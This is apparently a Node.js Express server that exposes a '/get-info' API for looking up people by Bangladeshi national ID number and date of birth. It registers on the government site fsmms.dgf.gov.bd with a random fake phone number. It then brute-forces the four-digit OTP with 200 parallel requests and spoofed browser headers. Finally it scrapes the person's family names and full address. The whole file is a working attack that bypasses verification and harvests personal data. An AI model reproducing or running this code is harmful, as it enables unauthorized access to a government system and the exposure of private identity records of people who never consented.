const express = require('express');
const axios = require('axios');
const cors = require('cors');
const http = require('http');
const https = require('https');
const pMap = require('p-map');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// ==================== FAST ENGINE SETTINGS ====================
const MOBILE_PREFIX = "016";
const BATCH_SIZE = 800;          // batch size boosted
const MAX_WORKERS = 200;         // 200 OTP parallel
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";

const agentHTTP = new http.Agent({ keepAlive: true, maxSockets: 300 });
const agentHTTPS = new https.Agent({ keepAlive: true, maxSockets: 300 });

// Axios KEEP-ALIVE instance
const axiosFast = axios.create({
    httpAgent: agentHTTP,
    httpsAgent: agentHTTPS,
    timeout: 6000
});

// Enhanced headers
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://fsmms.dgf.gov.bd',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
};

// ==================== HELPERS ====================
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) {
        randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return "#" + uppercase + randomChars;
}

function generateOTPRange() {
    const range = [];
    for (let i = 0; i < 10000; i++) {
        range.push(i.toString().padStart(4, '0'));
    }
    return range;
}

// ==================== SESSION CREATION ====================
async function getSessionAndBypass(nid, dob, mobile, password) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';

        const headers = {
            ...BASE_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
        };

        const data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": mobile,
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        };

        const response = await axiosFast.post(url, data, {
            maxRedirects: 0,
            validateStatus: null,
            headers: headers
        });

        if (response.status === 302 && response.headers.location.includes('mov-verification')) {
            const cookies = response.headers['set-cookie'];
            return {
                cookies: cookies,
                session: axiosFast
            };
        } else {
            throw new Error('Bypass Failed - Check NID and DOB');
        }

    } catch (err) {
        throw new Error("Session creation failed: " + err.message);
    }
}

// ==================== FAST OTP TRYING (Parallel) ====================
async function tryOTP(session, cookies, otp) {
    try {
        const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';

        const headers = {
            ...BASE_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookies.join('; '),
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        };

        const data = {
            otpDigit1: otp[0],
            otpDigit2: otp[1],
            otpDigit3: otp[2],
            otpDigit4: otp[3]
        };

        const response = await session.post(url, data, {
            validateStatus: null,
            maxRedirects: 0,
            headers: headers
        });

        if (response.status === 302 && response.headers.location.includes(TARGET_LOCATION)) {
            return otp;
        }
        return null;

    } catch {
        return null;
    }
}

async function tryBatch(session, cookies, otpBatch) {
    const controller = new AbortController();

    const mapper = async otp => {
        if (controller.signal.aborted) return null;
        const ok = await tryOTP(session, cookies, otp);
        if (ok) controller.abort(); // Stop others
        return ok;
    };

    const results = await pMap(otpBatch, mapper, { concurrency: MAX_WORKERS });
    return results.find(r => r !== null) || null;
}

// ==================== DATA FETCH ====================
async function fetchFormData(session, cookies) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';

    const headers = {
        ...BASE_HEADERS,
        'Cookie': cookies.join('; '),
        'Sec-Fetch-Site': 'cross-site',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
    };

    const response = await session.get(url, { headers: headers });
    return response.data;
}

// Extract input values
function extractFields(html, ids) {
    const result = {};

    ids.forEach(field_id => {
        const regex = new RegExp(`<input[^>]*id="${field_id}"[^>]*value="([^"]*)"`);
        const match = html.match(regex);
        result[field_id] = match ? match[1] : "";
    });

    return result;
}

function enrichData(contractor_name, result, nid, dob) {
    const mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.fatherName || "",
        "motherName": result.motherName || "",
        "spouseName": result.spouseName || "",
        "gender": "",
        "religion": "",
        "birthPlace": result.nidPerDistrict || "",
        "nationality": result.nationality || "",
        "division": result.nidPerDivision || "",
        "district": result.nidPerDistrict || "",
        "upazila": result.nidPerUpazila || "",
        "union": result.nidPerUnion || "",
        "village": result.nidPerVillage || "",
        "ward": result.nidPerWard || "",
        "zip_code": result.nidPerZipCode || "",
        "post_office": result.nidPerPostOffice || ""
    };

    const address_parts = [
        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
        `উপজেলা: ${result.nidPerUpazila || ''}`,
        `জেলা: ${result.nidPerDistrict || ''}`,
        `বিভাগ: ${result.nidPerDivision || ''}`
    ];

    const filtered_parts = address_parts.filter(part => {
        const parts = part.split(": ");
        return parts[1] && parts[1].trim() && parts[1] !== "-";
    });

    const address_line = filtered_parts.join(", ");

    mapped.permanentAddress = address_line;
    mapped.presentAddress = address_line;

    return mapped;
}

// ==================== API ENDPOINTS ====================
app.get('/', (req, res) => {
    res.json({
        message: 'Ultra-Fast NID Info API is running',
        endpoints: {
            getInfo: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD'
        }
    });
});

app.get('/get-info', async(req, res) => {
    try {
        const { nid, dob } = req.query;

        if (!nid || !dob) {
            return res.status(400).json({ error: 'NID and DOB are required' });
        }

        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);

        console.log(`NID: ${nid}, DOB: ${dob}`);
        console.log(`Mobile: ${mobile}, Password: ${password}`);

        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);

        let otpRange = generateOTPRange();

        // Fast shuffle
        for (let i = otpRange.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [otpRange[i], otpRange[j]] = [otpRange[j], otpRange[i]];
        }

        let foundOTP = null;

        for (let i = 0; i < otpRange.length; i += BATCH_SIZE) {
            const batch = otpRange.slice(i, i + BATCH_SIZE);
            console.log(`Batch ${Math.floor(i/BATCH_SIZE)+1}`);

            foundOTP = await tryBatch(session, cookies, batch);
            if (foundOTP) break;
        }

        if (!foundOTP) {
            return res.status(404).json({
                success: false,
                error: "OTP not found"
            });
        }

        const html = await fetchFormData(session, cookies);

        const ids = [
            "contractorName", "fatherName", "motherName", "spouseName",
            "nidPerDivision", "nidPerDistrict", "nidPerUpazila",
            "nidPerUnion", "nidPerVillage", "nidPerWard",
            "nidPerZipCode", "nidPerPostOffice",
            "nidPerHolding", "nidPerMouza"
        ];

        const extracted = extractFields(html, ids);
        const finalData = enrichData(extracted.contractorName || "", extracted, nid, dob);

        res.json({
            success: true,
            data: finalData,
            sessionInfo: {
                mobileUsed: mobile,
                otpFound: foundOTP
            }
        });

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/health', (req, res) => {
    res.json({ status: 'OK', time: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Ultra-Fast NID API running on ${PORT}`);
});
